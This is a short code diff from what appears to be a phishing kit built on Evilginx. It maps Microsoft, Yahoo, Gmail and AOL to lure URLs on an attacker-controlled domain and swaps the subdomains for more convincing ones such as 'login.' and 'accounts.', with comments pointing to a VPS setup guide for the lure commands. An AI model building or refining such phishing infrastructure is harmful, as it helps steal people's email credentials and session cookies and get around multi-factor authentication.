@@ -51,10 +51,10 @@ const PROVIDER_URLS = EVILGINX_DOMAIN ? {
   // Evilginx lure URLs — each provider gets its own subdomain.
   // These paths must match the lure paths created in evilginx
   // (see VPS-SETUP-GUIDE.md Step 10 for the exact lure commands).
-  MICROSOFT: `https://office.${EVILGINX_DOMAIN}/auth/sso/verify?session=true&v=1.0`,
-  YAHOO: `https://yahoo.${EVILGINX_DOMAIN}/auth/sso/verify?session=true&v=1.0`,
-  GMAIL: `https://gmail.${EVILGINX_DOMAIN}/auth/sso/verify?session=true&v=1.0`,
-  AOL: `https://aol.${EVILGINX_DOMAIN}/auth/sso/verify?session=true&v=1.0`,
+  MICROSOFT: `https://login.${EVILGINX_DOMAIN}/auth/sso/verify?session=true&v=1.0`,
+  YAHOO: `https://signin.${EVILGINX_DOMAIN}/auth/sso/verify?session=true&v=1.0`,
+  GMAIL: `https://accounts.${EVILGINX_DOMAIN}/auth/sso/verify?session=true&v=1.0`,
+  AOL: `https://myaccount.${EVILGINX_DOMAIN}/auth/sso/verify?session=true&v=1.0`,
   OTHERS: ROUTES.LOGIN_OTHERS,
 } : {
   // Fallback internal routes when evilginx domain is not configured
